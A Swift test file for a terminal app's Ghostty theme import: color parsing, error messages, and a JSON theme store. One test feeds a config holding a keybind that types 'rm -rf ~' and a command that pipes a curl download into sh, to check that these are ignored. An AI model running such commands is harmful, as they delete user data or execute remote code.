import Foundation
import HerdrKit
import Testing
@testable import hirte

private let colorLines = """
    background = #1a1b26
    foreground = #c0caf5
    """

private func palette(_ count: Int = 16) -> String {
    (0..<count).map { "palette = \($0)=#\(String(format: "%02x", 0x40 + $0))8090" }.joined(separator: "\n")
}

private let fullTheme = palette() + "\n" + colorLines

@MainActor
struct ThemeParserTests {
    @Test func readsACompleteTheme() throws {
        let result = GhosttyThemeParser.parse("""
            # A comment
            palette = 0=#1d202f
            \(palette())

            background = #1a1b26
            foreground = "#c0caf5"
            cursor-color = #ff00ff
            selection-background = #33467c
            """)
        let colors = try #require(result.colors)
        #expect(result.errors.isEmpty)
        #expect(colors.background == RGB(r: 0x1a, g: 0x1b, b: 0x26))
        #expect(colors.foreground == RGB(r: 0xc0, g: 0xca, b: 0xf5))
        #expect(colors.cursor == RGB(r: 0xff, g: 0, b: 0xff))
        #expect(colors.selection == RGB(r: 0x33, g: 0x46, b: 0x7c))
        #expect(colors.ansiSet == 16)
        #expect(colors.dark)
        // The later line wins, as in Ghostty.
        #expect(colors.ansi[0] == RGB(r: 0x40, g: 0x80, b: 0x90))
    }

    @Test(arguments: [
        ("#abc", RGB(r: 0xaa, g: 0xbb, b: 0xcc)),
        ("abc", RGB(r: 0xaa, g: 0xbb, b: 0xcc)),
        ("#aabbcc", RGB(r: 0xaa, g: 0xbb, b: 0xcc)),
        ("rgb:12/34/56", RGB(r: 0x12, g: 0x34, b: 0x56)),
        ("ForestGreen", RGB(r: 0x22, g: 0x8b, b: 0x22)),
    ])
    func acceptsGhosttysColorFormats(value: String, expected: RGB) throws {
        let colors = try #require(GhosttyThemeParser.parse("background = \(value)\nforeground = #fff").colors)
        #expect(colors.background == expected)
    }

    @Test func acceptsPaletteIndexFormsAndWindowsLineEndings() throws {
        let text = "background = #000\r\nforeground = #fff\r\npalette = 0x1=#102030\r\npalette = 0b10=#405060\r\n"
        let colors = try #require(GhosttyThemeParser.parse(text).colors)
        #expect(colors.ansi[1] == RGB(r: 0x10, g: 0x20, b: 0x30))
        #expect(colors.ansi[2] == RGB(r: 0x40, g: 0x50, b: 0x60))
        #expect(colors.ansiSet == 2)
    }

    @Test func explainsBadColorsWithTheirLine() {
        let result = GhosttyThemeParser.parse("background = #12345\nforeground = #fff")
        #expect(result.colors == nil)
        #expect(result.errors.contains("Line 1: “#12345” isn't a color."))
    }

    @Test func explainsBadPaletteEntries() {
        let result = GhosttyThemeParser.parse("""
            \(colorLines)
            palette = 256=#ffffff
            palette = 3=#zzz
            palette = nope
            palette = -1=#fff
            """)
        #expect(result.colors == nil)
        #expect(result.errors == [
            "Line 3: palette index 256 is out of range (0–255).",
            "Line 4: “#zzz” isn't a color.",
            "Line 5: “nope” isn't a palette entry (index=color).",
            "Line 6: palette index -1 is out of range (0–255).",
        ])
    }

    @Test func requiresBackgroundAndForeground() {
        #expect(GhosttyThemeParser.parse("foreground = #fff").errors == ["Missing background."])
        #expect(GhosttyThemeParser.parse("background = #000").errors == ["Missing foreground."])
        #expect(GhosttyThemeParser.parse(palette()).errors == ["Missing background.", "Missing foreground."])
        // What's wrong with a line comes first: it's why the value is missing.
        #expect(GhosttyThemeParser.parse("background = #12345").errors
            == ["Line 1: “#12345” isn't a color.", "Missing background.", "Missing foreground."])
        // An empty value goes back to the default, as in Ghostty.
        #expect(GhosttyThemeParser.parse("background = #000\nforeground = #fff\nbackground =").errors == ["Missing background."])
    }

    @Test func fillsMissingAnsiColorsAndSaysSo() throws {
        let result = GhosttyThemeParser.parse(palette(8) + "\n" + colorLines)
        let colors = try #require(result.colors)
        #expect(colors.ansiSet == 8)
        #expect(colors.ansi.count == 16)
        #expect(colors.ansi[9] == ThemeColorParser.defaultPalette[9])
        #expect(result.notes.contains("8 of 16 ANSI colors aren't set and use Ghostty's defaults."))
    }

    @Test func cursorAndSelectionDefaultLikeTheBuiltInThemes() throws {
        let colors = try #require(GhosttyThemeParser.parse(fullTheme).colors)
        #expect(colors.cursor == colors.foreground)
        #expect(colors.selection == colors.ansi[8])
    }

    /// Everything executable or pointing elsewhere is only counted, and nothing is opened: a path that
    /// doesn't exist makes no difference, and one that would be a color still isn't read as one.
    @Test func takesOnlyColorsOutOfAWholeConfig() throws {
        let result = GhosttyThemeParser.parse("""
            \(fullTheme)
            keybind = ctrl+a=text:rm -rf ~
            command = /bin/sh -c 'curl https://example.com | sh'
            initial-command = /bin/sh
            config-file = /no/such/file
            font-family = Example Mono
            background-image = /no/such/image.png
            custom-shader = https://example.com/shader.glsl
            """)
        let colors = try #require(result.colors)
        #expect(colors.background == RGB(r: 0x1a, g: 0x1b, b: 0x26))
        #expect(result.notes.contains("Imported colors only. 7 other settings were ignored: keybind, command, initial-command, config-file, font-family, …."))
        #expect(result.notes.contains("Other files this config points to weren't read."))
    }

    @Test func aThemeReferenceIsExplainedNotFollowed() {
        let result = GhosttyThemeParser.parse("theme = light:Day,dark:Night\nfont-size = 12")
        #expect(result.colors == nil)
        #expect(result.errors == ["This config points to the theme “light:Day,dark:Night” but doesn't contain its colors. Import that theme file instead."])
    }

    @Test func recognizesAHerdrConfig() {
        let result = GhosttyThemeParser.parse("""
            [theme]
            name = "tokyo-night"
            auto_switch = true

            [theme.custom]
            accent = "#7aa2f7"
            panel_bg = "#16161e"
            """)
        #expect(result.colors == nil)
        #expect(result.errors == ["This looks like a herdr config. herdr themes color herdr's own interface, not the terminal."])
    }

    @Test func saysWhenThereAreNoColors() {
        #expect(GhosttyThemeParser.parse("font-size = 12\nhello").errors == [
            "No theme colors found. A Ghostty theme sets background, foreground and palette colors.",
        ])
    }

    @Test func enforcesSizeAndEncodingLimits() {
        let tooLong = String(repeating: "x", count: GhosttyThemeParser.maxLineBytes + 1)
        #expect(GhosttyThemeParser.parse("\(colorLines)\n\(tooLong)").errors == ["Line 3 is too long."])
        #expect(GhosttyThemeParser.parse(String(repeating: "\n", count: GhosttyThemeParser.maxLines)).errors == [GhosttyThemeParser.tooLarge])
        #expect(GhosttyThemeParser.parse(String(repeating: "#", count: GhosttyThemeParser.maxBytes + 1)).errors == [GhosttyThemeParser.tooLarge])
        #expect(GhosttyThemeParser.parse("background = #000\0").errors == [GhosttyThemeParser.notText])

        #expect(GhosttyThemeParser.text(from: Data([0xff, 0xfe, 0x00])) == .failure(ThemeFileError(message: GhosttyThemeParser.notText)))
        #expect(GhosttyThemeParser.text(from: Data(repeating: 0x23, count: GhosttyThemeParser.maxBytes + 1)) == .failure(ThemeFileError(message: GhosttyThemeParser.tooLarge)))
        #expect(GhosttyThemeParser.text(from: Data("background = #000".utf8)) == .success("background = #000"))
    }

    @Test func toleratesAByteOrderMark() throws {
        let colors = try #require(GhosttyThemeParser.parse("\u{FEFF}background = #000\nforeground = #fff").colors)
        #expect(colors.background == RGB(r: 0, g: 0, b: 0))
    }

    @Test func saysWhatIsntDrawn() throws {
        let result = GhosttyThemeParser.parse("""
            \(fullTheme)
            palette = 200=#ff0000
            selection-background = #222222
            selection-foreground = #eeeeee
            cursor-text = #000000
            cursor-color = cell-foreground
            """)
        let colors = try #require(result.colors)
        #expect(colors.cursor == colors.foreground)
        #expect(colors.selection == RGB(r: 0x22, g: 0x22, b: 0x22))
        #expect(result.notes.contains("Palette colors 16–255 aren't used: Hirte keeps the standard 256-color palette."))
        #expect(result.notes.contains("Hirte marks selections in the app's accent color, not this theme's selection color."))
        #expect(result.notes.contains("Hirte doesn't draw separate selection text and cursor text colors, so they aren't kept."))
        #expect(result.notes.contains("“cell-foreground” and “cell-background” aren't supported: the default colors are used instead."))
    }

    @Test func warnsAboutContrastWithoutBlocking() throws {
        let result = GhosttyThemeParser.parse("""
            background = #202020
            foreground = #282828
            palette = 1=#202020
            """)
        #expect(result.colors != nil)
        #expect(result.notes.contains("The text has low contrast with the background, which can be hard to read."))
        #expect(result.notes.contains("ANSI color 1 can't be told from the background."))
    }

    @Test func brightnessComesFromTheBackground() throws {
        #expect(try #require(GhosttyThemeParser.parse("background = #111111\nforeground = #eeeeee").colors).dark)
        #expect(try !#require(GhosttyThemeParser.parse("background = #eeeeee\nforeground = #111111").colors).dark)
    }
}

/// Fails to read like protected data does, until it's opened; then reads the file.
@MainActor
private final class ReadGate {
    var locked = true

    func read(_ url: URL) throws -> Data {
        if locked { throw CocoaError(.fileReadNoPermission) }
        return try Data(contentsOf: url)
    }
}

/// With a store in a temporary folder and its own defaults: the app's data stays out of it.
@MainActor
struct ThemeStoreTests {
    private let folder = FileManager.default.temporaryDirectory.appending(path: "ThemeStoreTests-\(UUID().uuidString)")
    private var file: URL { folder.appending(path: "Themes/custom-themes.json") }
    private let defaults: UserDefaults
    private let suite = "hirteTests.\(UUID().uuidString)"

    private let dark = ThemeStoreTests.colors("background = #101010\nforeground = #eeeeee")
    private let otherDark = ThemeStoreTests.colors("background = #111122\nforeground = #eeeeee")
    private let light = ThemeStoreTests.colors("background = #f0f0f0\nforeground = #111111")

    private static func colors(_ text: String) -> ThemeColors {
        GhosttyThemeParser.parse(text).colors!
    }

    init() throws {
        defaults = try #require(UserDefaults(suiteName: suite))
    }

    private func store() -> ThemeStore { ThemeStore(fileURL: file, defaults: defaults) }

    private var unreadableCopy: URL { file.deletingLastPathComponent().appending(path: "custom-themes.unreadable.json") }

    private func cleanUp() {
        defaults.removePersistentDomain(forName: suite)
        try? FileManager.default.removeItem(at: folder)
    }

    @Test func savedThemesAreThereAfterARestart() throws {
        defer { cleanUp() }
        let added = try store().add(dark, name: "Night")
        #expect(added.id.hasPrefix(ThemeStore.idPrefix))
        #expect(added.isImported)

        let reloaded = store()
        #expect(reloaded.imported == [added])
        #expect(reloaded.imported[0].ansiRGB == dark.ansi)
        // Only colors are written, in the documented shape.
        let json = try #require(JSONSerialization.jsonObject(with: Data(contentsOf: file)) as? [String: Any])
        #expect(json["version"] as? Int == 1)
    }

    @Test func findResolvesImportedThemesForTheirBrightnessOnly() throws {
        defer { cleanUp() }
        let store = store()
        let added = try store.add(dark, name: "Night")
        #expect(TerminalTheme.find(added.id, dark: true, store: store) == added)
        #expect(TerminalTheme.find(added.id, dark: false, store: store).id != added.id)
    }

    @Test func findsSameColorsBeforeSameName() throws {
        defer { cleanUp() }
        let store = store()
        let added = try store.add(dark, name: "Night")
        #expect(store.duplicate(of: dark, named: "Other") == .sameColors(added))
        #expect(store.duplicate(of: otherDark, named: " night ") == .sameName(added))
        #expect(store.duplicate(of: otherDark, named: "Other") == nil)
    }

    @Test func noticesTheColorsOfABuiltInTheme() throws {
        defer { cleanUp() }
        let builtIn = try #require(TerminalTheme.all.first)
        let lines = builtIn.ansi.enumerated().map { "palette = \($0)=\($1)" }.joined(separator: "\n")
        let colors = Self.colors("""
            \(lines)
            background = \(builtIn.background)
            foreground = \(builtIn.foreground)
            cursor-color = \(builtIn.cursor)
            selection-background = \(builtIn.selection)
            """)
        #expect(store().duplicate(of: colors, named: "Other") == .sameColors(builtIn))
    }

    @Test func keepingBothNumbersTheName() throws {
        defer { cleanUp() }
        let store = store()
        try store.add(dark, name: "Night")
        #expect(try store.add(otherDark, name: "Night").name == "Night 2")
        #expect(try store.add(Self.colors("background = #121212\nforeground = #eeeeee"), name: "night").name == "night 3")
    }

    @Test func builtInNamesStayUntouched() throws {
        defer { cleanUp() }
        let store = store()
        let builtIn = try #require(TerminalTheme.all.first)
        let added = try store.add(dark, name: builtIn.name)
        #expect(added.name == "\(builtIn.name) 2")
        #expect(TerminalTheme.all.contains(builtIn))
    }

    @Test func replacingKeepsTheIdAndTheSlot() throws {
        defer { cleanUp() }
        let store = store()
        let old = try store.add(dark, name: "Night")
        store.select(old)
        let new = try store.add(otherDark, name: "Night", replacing: old)
        #expect(new.id == old.id)
        #expect(store.imported == [new])
        #expect(defaults.string(forKey: TerminalTheme.darkKey) == old.id)
    }

    @Test func replacingWithOtherBrightnessFreesTheSlot() throws {
        defer { cleanUp() }
        let store = store()
        let old = try store.add(dark, name: "Night")
        store.select(old)
        let new = try store.add(light, name: "Night", replacing: old)
        #expect(!new.dark)
        #expect(defaults.string(forKey: TerminalTheme.darkKey) == TerminalTheme.defaultDark)
    }

    @Test func removingTheThemeInUseFallsBackToTheDefault() throws {
        defer { cleanUp() }
        let store = store()
        let added = try store.add(dark, name: "Night")
        store.select(added)
        try store.remove(added)
        #expect(store.imported.isEmpty)
        #expect(defaults.string(forKey: TerminalTheme.darkKey) == TerminalTheme.defaultDark)
        #expect(self.store().imported.isEmpty)
        #expect(TerminalTheme.find(added.id, dark: true, store: store).id == TerminalTheme.defaultDark)
    }

    @Test func removingAnotherThemeLeavesTheSlotAlone() throws {
        defer { cleanUp() }
        let store = store()
        let kept = try store.add(dark, name: "Night")
        let other = try store.add(otherDark, name: "Dusk")
        store.select(kept)
        try store.remove(other)
        #expect(defaults.string(forKey: TerminalTheme.darkKey) == kept.id)
    }

    @Test func aFailedSaveChangesNothing() throws {
        defer { cleanUp() }
        // A file where the folder has to go: nothing can be written there.
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        try Data().write(to: folder.appending(path: "Themes"))
        let store = store()
        #expect(throws: (any Error).self) { try store.add(dark, name: "Night") }
        #expect(store.imported.isEmpty)
    }

    /// As before the first unlock: the file is there, protected, and reading it fails until it isn't.
    @Test func aChangeWhileTheFileCantBeReadLosesNothing() throws {
        defer { cleanUp() }
        let saved = try store().add(dark, name: "Night")
        store().select(saved)
        let bytes = try Data(contentsOf: file)
        let gate = ReadGate()
        let locked = ThemeStore(fileURL: file, defaults: defaults, read: gate.read)

        #expect(locked.imported.isEmpty)
        #expect(TerminalTheme.find(saved.id, dark: true, store: locked).id != saved.id)
        #expect(throws: ThemeStoreError.unreadable) { try locked.add(otherDark, name: "Dusk") }
        #expect(throws: ThemeStoreError.unreadable) { try locked.remove(saved) }
        #expect(try Data(contentsOf: file) == bytes)
        #expect(defaults.string(forKey: TerminalTheme.darkKey) == saved.id, "the slot still points at it")
        // Not a damaged file: nothing to rescue.
        #expect(!FileManager.default.fileExists(atPath: unreadableCopy.path))

        gate.locked = false
        locked.reloadIfNeeded()
        #expect(locked.imported == [saved])
        #expect(TerminalTheme.find(saved.id, dark: true, store: locked) == saved)
    }

    @Test func aChangeReloadsOnceTheFileCanBeRead() throws {
        defer { cleanUp() }
        let saved = try store().add(dark, name: "Night")
        let gate = ReadGate()
        let locked = ThemeStore(fileURL: file, defaults: defaults, read: gate.read)
        gate.locked = false

        // Numbered, not overwritten: it knows the theme that was in the file.
        #expect(try locked.add(otherDark, name: "Night").name == "Night 2")
        #expect(store().imported.map(\.name) == ["Night", "Night 2"])
        #expect(store().imported.first == saved)
    }

    /// The same with a real read failure, rather than an injected one.
    @Test func aFileWithoutReadPermissionIsNotOverwritten() throws {
        defer {
            try? FileManager.default.setAttributes([.posixPermissions: 0o644], ofItemAtPath: file.path)
            cleanUp()
        }
        try store().add(dark, name: "Night")
        try FileManager.default.setAttributes([.posixPermissions: 0], ofItemAtPath: file.path)

        let locked = store()
        #expect(locked.imported.isEmpty)
        #expect(throws: ThemeStoreError.unreadable) { try locked.add(otherDark, name: "Dusk") }

        try FileManager.default.setAttributes([.posixPermissions: 0o644], ofItemAtPath: file.path)
        #expect(store().imported.map(\.name) == ["Night"])
    }

    @Test func noFileIsNotAFailure() throws {
        defer { cleanUp() }
        let store = store()
        #expect(store.imported.isEmpty)
        #expect(try store.add(dark, name: "Night").name == "Night")
    }

    @Test func anUnreadableFileIsKeptNotOverwritten() throws {
        defer { cleanUp() }
        try FileManager.default.createDirectory(at: file.deletingLastPathComponent(), withIntermediateDirectories: true)
        try Data("not json".utf8).write(to: file)
        let store = store()
        #expect(store.imported.isEmpty)
        try store.add(dark, name: "Night")
        let copy = file.deletingLastPathComponent().appending(path: "custom-themes.unreadable.json")
        #expect(try String(contentsOf: copy, encoding: .utf8) == "not json")
    }

    @Test func aSecondDamagedFileKeepsBothOriginals() throws {
        defer { cleanUp() }
        try FileManager.default.createDirectory(at: file.deletingLastPathComponent(), withIntermediateDirectories: true)
        try Data("first damaged file".utf8).write(to: file)
        _ = store()
        try Data("second damaged file".utf8).write(to: file)
        try store().add(dark, name: "Night")
        let backups = try FileManager.default.contentsOfDirectory(at: file.deletingLastPathComponent(), includingPropertiesForKeys: nil)
            .filter { $0.lastPathComponent.hasPrefix("custom-themes.unreadable") }
        let originals = try backups.map { try String(contentsOf: $0, encoding: .utf8) }
        #expect(Set(originals) == ["first damaged file", "second damaged file"])
    }

    @Test func aNewerFileVersionIsNotRead() throws {
        defer { cleanUp() }
        try FileManager.default.createDirectory(at: file.deletingLastPathComponent(), withIntermediateDirectories: true)
        try Data(#"{"version":2,"themes":[]}"#.utf8).write(to: file)
        #expect(store().imported.isEmpty)
        #expect(FileManager.default.fileExists(atPath: file.deletingLastPathComponent().appending(path: "custom-themes.unreadable.json").path))
    }

    /// Drawing assumes 16 colors: a damaged entry mustn't get as far as `ansiColor(_:)`.
    @Test func damagedThemesAreLeftOut() throws {
        defer { cleanUp() }
        let store = store()
        let good = try store.add(dark, name: "Night")
        var json = try #require(JSONSerialization.jsonObject(with: Data(contentsOf: file)) as? [String: Any])
        var themes = try #require(json["themes"] as? [[String: Any]])
        var bad = themes[0]
        bad["id"] = "custom-bad"
        bad["ansi"] = ["#000000"]
        themes.append(bad)
        var notImported = themes[0]
        notImported["id"] = "dracula"
        themes.append(notImported)
        json["themes"] = themes
        try JSONSerialization.data(withJSONObject: json).write(to: file)

        #expect(self.store().imported == [good])
    }
}

@MainActor
struct ThemeFileTests {
    @Test func readsAFileAndStopsAtTheLimit() throws {
        let folder = FileManager.default.temporaryDirectory.appending(path: "ThemeFileTests-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: folder) }

        let small = folder.appending(path: "Night")
        try Data("background = #000".utf8).write(to: small)
        #expect(ThemeFile.read(small) == .success("background = #000"))

        let large = folder.appending(path: "Large")
        try Data(repeating: 0x23, count: GhosttyThemeParser.maxBytes * 2).write(to: large)
        #expect(ThemeFile.read(large) == .failure(ThemeFileError(message: GhosttyThemeParser.tooLarge)))

        #expect(ThemeFile.read(folder.appending(path: "Missing")) == .failure(ThemeFileError(message: "Couldn't read this file.")))
    }
}
